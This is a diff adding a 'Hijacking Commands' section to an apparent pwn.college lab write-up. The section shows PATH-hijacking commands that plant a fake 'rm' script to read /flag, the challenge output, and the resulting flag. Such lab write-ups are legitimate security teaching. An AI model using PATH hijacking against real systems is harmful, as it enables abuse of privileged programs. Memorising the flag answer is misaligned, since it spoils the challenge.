@@ -67,4 +67,19 @@ Invoking 'win'....
 ### Explanation:
 
 
-# 
+# Hijacking Commands
+### Commands:
+```
+1) hacker@path~hijacking-commands:~$ echo cat /flag > rm
+2) hacker@path~hijacking-commands:~$ PATH=~:$PATH
+3) hacker@path~hijacking-commands:~$ chmod a+x rm
+4) hacker@path~hijacking-commands:~$ /challenge/run
+```
+Output:
+
+Trying to remove /flag...
+
+Found 'rm' command at /home/hacker/rm. Executing!
+### Flag:
+>pwn.college{otDZ9DjSgm5Cr8nsjTl7K7kSuY7.ddzNyUDL3cDN0czW}
+### Explanation:
